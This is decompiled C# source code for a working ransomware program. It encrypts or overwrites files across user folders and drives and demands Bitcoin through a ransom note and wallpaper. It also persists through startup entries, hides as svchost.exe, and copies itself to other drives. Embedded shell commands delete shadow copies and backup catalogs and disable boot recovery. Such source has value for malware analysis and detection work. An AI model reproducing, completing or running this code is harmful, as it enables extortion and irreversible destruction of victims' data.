using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal class Class0
{
	public static class Class1
	{
		public const int int_0 = 797;

		public static IntPtr intptr_0 = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr intptr_1);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr intptr_1, IntPtr intptr_2);
	}

	[CompilerGenerated]
	private sealed class Class2
	{
		public string string_0;

		public bool method_0(string string_1)
		{
			return string_1 == string_0.ToLower();
		}
	}

	private static string string_0 = Environment.UserName;

	private static string string_1 = "C:\\Users\\";

	public static string string_2 = "7z459ajrk722yn8c5j4fg";

	public static bool bool_0 = true;

	public static string string_3 = "encrypt";

	private static bool bool_1 = true;

	private static string string_4 = "surprise.exe";

	private static bool bool_2 = true;

	private static string string_5 = "svchost.exe";

	public static string string_6 = "2X28tfRmWaPyPQgvoHV";

	private static bool bool_3 = true;

	private static bool bool_4 = true;

	private static int int_0 = 15;

	private static string string_7 = "/9j/4AAQSkZJRgABAQAACgAKAAD/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AVN//2Q==";

	public static string string_8 = "1qw0ll8p9m8uezhqhyd";

	private static string string_9 = "read_it.txt";

	private static bool bool_5 = true;

	private static bool bool_6 = true;

	private static bool bool_7 = true;

	private static bool bool_8 = true;

	public static string string_10 = "17CqMQFeuB3NTzJ";

	public static string string_11 = string_10 + string_6;

	public static string string_12 = "bc";

	public static string string_13 = string_12 + string_8 + string_2;

	public static readonly Regex regex_0 = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] string_14 = new string[13]
	{
		"YOU ARE HACKED", "!!!YOUR FILES HAVE BEEN ENCRYPTED!!!", "The Key to Decrypt Your Files WilI Be DELETED in 7 Days", "--------------------------------------------------------------", "Send Me 0.0030 Bitcoins (100$)", "(You Have Only 7 Days From Now)", "--------------------------------------------------------------", "Bitcoin Address: bc1qwgeqdnzjzhh95fqyyhlcaczhq6244fsdmajch4", "--------------------------------------------------------------", "After you Send Me an Email With Your ID: [redacted]",
		"BlackMrxTeam@protonmail.ch", "I Will Send You the Key to Decrypt Your Files", "--------------------------------------------------------------"
	};

	private static string[] string_15 = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random_0 = new Random();

	[CompilerGenerated]
	private static ThreadStart threadStart_0;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint uint_0, uint uint_1, string string_16, uint uint_2);

	private static void Main(string[] args)
	{
		if (smethod_2())
		{
			Environment.Exit(1);
		}
		if (bool_4)
		{
			smethod_1();
		}
		if (bool_5)
		{
			smethod_16(string_5);
		}
		else if (bool_2)
		{
			smethod_15(string_5);
		}
		if (bool_3)
		{
			smethod_17();
		}
		smethod_14();
		if (bool_5)
		{
			if (bool_6)
			{
				smethod_22();
			}
			if (bool_7)
			{
				smethod_23();
			}
			if (bool_8)
			{
				smethod_24();
			}
		}
		if (bool_1)
		{
			smethod_20(string_4);
		}
		smethod_18();
		smethod_25(string_7);
		new Thread((ThreadStart)delegate
		{
			smethod_0();
		}).Start();
	}

	public static void smethod_0()
	{
		Application.Run((Form)(object)new GClass0.GForm0());
	}

	private static void smethod_1()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(int_0 * 1000);
		}
	}

	private static bool smethod_2()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] smethod_3(int int_1)
	{
		Random random = new Random();
		int_1++;
		byte[] array = new byte[int_1];
		random.NextBytes(array);
		return array;
	}

	public static string smethod_4(int int_1)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < int_1; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random_0.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string smethod_5(int int_1)
	{
		if (string_3 == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < int_1; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random_0.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return string_3;
	}

	public static string smethod_6(string string_16)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_16);
		return Convert.ToBase64String(bytes);
	}

	public static string smethod_7(string string_16)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_16);
		return "<EncyptedKey>" + smethod_6(smethod_4(41)) + "<EncyptedKey> " + smethod_4(2) + Convert.ToBase64String(bytes);
	}

	private static void smethod_8(string string_16)
	{
		try
		{
			string[] files = Directory.GetFiles(string_16);
			bool flag = true;
			string string_17;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string_17 = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(string_15, (string string_1) => string_1 == string_17.ToLower()) || !(fileName != string_9))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152L)
					{
						if (bool_0)
						{
							smethod_12(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000L)
					{
						Random random = new Random();
						int int_ = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(smethod_3(int_));
						File.WriteAllText(files[i], smethod_7(@string));
						File.Move(files[i], files[i] + "." + smethod_5(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(smethod_3(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], smethod_7(string2));
						File.Move(files[i], files[i] + "." + smethod_5(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(string_16 + "/" + string_9, string_14);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(string_16);
			for (int j = 0; j < directories.Length; j++)
			{
				smethod_8(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string smethod_9()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>r2c3L3gF96E7lu/pJ5fzr+u1ed28fVJp6tyQbhkcO/W+7FUEOcrpNJVRjvZOKRDAorX60GOp7XTxZl6CGnLu0IDaTXXUboTI3wb2uq4BPOiRlITSJBJyE0OiKnXO4TM5jPJdi0bvVxF0hr5YDv0rzWsH5zGWlZ+8v0sKEymmWsU=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string smethod_10(int int_1)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < int_1--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] smethod_11(byte[] byte_0, byte[] byte_1)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void smethod_12(string string_16)
	{
		byte[] byte_ = File.ReadAllBytes(string_16);
		string text = smethod_10(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = smethod_11(byte_, bytes);
		File.WriteAllText(string_16, "<EncryptedKey>" + smethod_13(text, smethod_9()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(string_16, string_16 + "." + smethod_5(4));
	}

	public static string smethod_13(string string_16, string string_17)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_16);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(string_17.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void smethod_14()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				smethod_8(driveInfo.ToString());
			}
		}
		string string_ = string_1 + string_0 + "\\Desktop";
		string string_2 = string_1 + string_0 + "\\Links";
		string string_3 = string_1 + string_0 + "\\Contacts";
		string string_4 = string_1 + string_0 + "\\Desktop";
		string string_5 = string_1 + string_0 + "\\Documents";
		string string_6 = string_1 + string_0 + "\\Downloads";
		string string_7 = string_1 + string_0 + "\\Pictures";
		string string_8 = string_1 + string_0 + "\\Music";
		string string_9 = string_1 + string_0 + "\\OneDrive";
		string string_10 = string_1 + string_0 + "\\Saved Games";
		string string_11 = string_1 + string_0 + "\\Favorites";
		string string_12 = string_1 + string_0 + "\\Searches";
		string string_13 = string_1 + string_0 + "\\Videos";
		smethod_8(string_);
		smethod_8(string_2);
		smethod_8(string_3);
		smethod_8(string_4);
		smethod_8(string_5);
		smethod_8(string_6);
		smethod_8(string_7);
		smethod_8(string_8);
		smethod_8(string_9);
		smethod_8(string_10);
		smethod_8(string_11);
		smethod_8(string_12);
		smethod_8(string_13);
		smethod_8(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		smethod_8(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		smethod_8(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		smethod_8(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		smethod_8(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		smethod_8(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void smethod_15(string string_16)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + string_16;
		if (!(friendlyName != string_16) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void smethod_16(string string_16)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + string_16;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != string_16) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					smethod_16(string_16);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				smethod_16(string_16);
			}
		}
	}

	private static void smethod_17()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string processName = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + processName + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
	}

	private static void smethod_18()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_9;
		try
		{
			File.WriteAllLines(text, string_14);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void smethod_19()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void smethod_20(string string_16)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + string_16))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + string_16);
				}
				catch
				{
				}
			}
		}
	}

	private static void smethod_21(string string_16)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + string_16;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void smethod_22()
	{
		smethod_21("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void smethod_23()
	{
		smethod_21("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void smethod_24()
	{
		smethod_21("wbadmin delete catalog -quiet");
	}

	public static void smethod_25(string string_16)
	{
		if (string_16 != "")
		{
			try
			{
				string text = Path.GetTempPath() + smethod_4(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(string_16));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}

	[CompilerGenerated]
	private static void smethod_26()
	{
		smethod_0();
	}
}
